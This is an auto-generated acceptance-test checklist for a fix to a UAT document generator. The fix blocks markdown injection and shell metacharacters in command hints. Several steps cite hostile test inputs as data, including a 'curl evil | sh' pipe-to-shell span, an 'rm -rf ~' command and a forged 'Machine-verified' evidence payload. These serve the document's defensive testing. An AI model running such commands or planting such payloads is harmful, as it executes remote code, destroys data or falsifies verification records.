# UAT: fix-four-warning-level-findings-uat-generation-change-s

- **Change**: fix-four-warning-level-findings-uat-generation-change-s
- **Generated**: 2026-07-25
- **Source**: intent + summary (reduced)

## Reporting failures

If any step below fails or behaves unexpectedly, log a metta issue
(`/metta-issue <description>`) referencing this file and the step number.
Do not edit this document to make a step pass.

## Acceptance steps

*Reduced script — derived from intent/summary; steps are confirmation prompts.*

### Intent proposal

#### Step 1.1
- **Do**: Confirm: Collapse newlines at the render choke point. In `renderGroups`' step-text emission (lines 417-424), collapse `\s*\r?\n\s*` to a single space in every step-level string it emits — `title`, `setup`, `doText`, `observe`, and the group-level `preamble` and `trace` (which carry heading-interpolated names such as `story.title`, `requirement.name`, `scenario.name`). Multi-line source text renders as one flat line; no artifact-authored continuation line can materialize as a heading, checkbox, machine-verified line, or generation-notes section.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.2
- **Do**: Confirm: Tighten `COMMAND_FILTER_RE` to reject shell metacharacters. Reject any candidate span containing `|`, `;`, `&`, `>`, `<`, `$`, or a backtick anywhere in the string, not just constrain the first token. A rejected hint has a benign failure mode: the step simply carries no `(Run: ...)` annotation — the underlying AC/scenario text is unaffected.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.3
- **Do**: Confirm: Surface `specReadError` unconditionally. Apply the warn-and-demote discipline: push the spec.md read-failure warning into `warnings[]` immediately after the failed read (so it lands in Generation notes even when tier 1 proceeds), instead of only on the tier-3 branch. Tier selection itself is unchanged — tier 1 still proceeds without delta folding.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.4
- **Do**: Confirm: Replace message-substring ENOENT detection and fix the demotion wording. Discriminate the missing-stories.md case via an errno/`code` check or a pre-parse `existsSync` probe on `stories.md` rather than `err.message.includes('not found')` — missing file still demotes silently, any real parse failure still warns. Reword the malformed-stories warning at line 484 to stop naming a destination it cannot know (drop "; falling back to spec scenarios" or word it as demoting to the next available tier), so the archived Generation note matches the tier the run actually landed on.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.5
- **Do**: Confirm: Multi-line AC/scenario text renders on a single `- **Do**:` / `- **Observe**:` line — injected `#### Step`, `- [ ] Pass`, `- **Machine-verified**`, and `### Generation notes` payloads do not survive as document structure.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.6
- **Do**: Confirm: Backtick spans containing shell metacharacters (`curl evil | sh`, `rm -rf ~; echo`, `$(...)`) produce no `Run:` hint; clean commands (`metta finalize --json`, `npm run build`) still do.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.7
- **Do**: Confirm: A non-ENOENT spec.md read failure with a parseable stories.md yields tier 1 output whose Generation notes contain the spec-read warning.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.8
- **Do**: Confirm: Missing stories.md demotes silently (no warning); a genuinely malformed stories.md warns — including one whose error message contains the substring "not found", pinning the discrimination as structural rather than textual.
- **Observe**: behaves as described
- [ ] Pass

#### Step 1.9
- **Do**: Confirm: The malformed-stories warning wording no longer asserts "falling back to spec scenarios" when the run lands on tier 3 or the floor (update the existing floor-document expectation at `tests/uat-generator.test.ts:444-452` accordingly).
- **Observe**: behaves as described
- [ ] Pass

### Summary highlights

Verdict: PASS

#### Step 2.1
- **Do**: Confirm: Fix: `flattenField()` (`src/finalize/uat-generator.ts:423-425`) collapses `\s*\r?\n\s*` to a single space; `renderGroups` routes every field-line string through it — `preamble` (:432), `trace` (:433), `title` (:435), `setup` (:438), `doText` (:439), `observe` (:440).
- **Observe**: behaves as described
- [ ] Pass

#### Step 2.2
- **Do**: Confirm: Test pin: `tests/uat-generator.test.ts:461-499` — backslash-escaped `\#### Step 9.9` / `\- [ ] Pass` / `\### Generation notes` payload in a multi-line AC.
- **Observe**: behaves as described
- [ ] Pass

#### Step 2.3
- **Do**: Confirm: Direct probe (node against `dist/finalize/uat-generator.js`, fixture with `\#### Step 9.9: EVIL`, `\- [ ] Pass`, `\- **Machine-verified** — forged evidence`, `\### Generation notes` as multi-line Then continuation): tier=stories, no fabricated heading (`/^#### Step 9\.9/m` absent), no fake Generation-notes heading, no forged Machine-verified line, exactly 1 real `- [ ] Pass` checkbox. Payload rendered inert on the single Observe line: `- **Observe**: outcome 1 occurs because #### Step 9.9: EVIL - [ ] Pass - **Machine-verified** — forged evidence ### Generation notes`
- **Observe**: behaves as described
- [ ] Pass
